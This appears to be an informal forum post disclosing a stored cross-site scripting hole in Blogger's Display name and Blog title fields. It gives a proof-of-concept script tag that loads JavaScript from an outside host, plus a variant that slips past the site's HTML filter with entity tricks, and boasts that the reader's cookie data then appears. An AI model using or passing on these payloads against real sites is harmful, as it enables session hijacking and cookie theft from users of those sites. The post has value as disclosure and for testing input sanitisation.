Blog input boxes

XSS vuln via Display name input box.

Blogger doesnt properally sanatize user input before generating it. For example, you can't use illegal characters in your username,or password, but for a "Display name", theyre allowed. Also, in Blog title, you can use them.

For a PoC in the display name box try putting:
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

When you visit your blog at http://whatever.blogspot.com, you'll see the code printedon the page, however it works. If you were to use a img tag as your display name, the image would be displayed.


And to bypass the not allowed html filter, we put the numerical equivlent of < before the actual tag, as well as &gt; after the tag

<&lt;SCRIPT SRC=http://ha.ckers.org/xss.js>&gt;

With that code above you'll notice your cookie data has popped up. Awesome huh? Below the screenshot & cookie data:
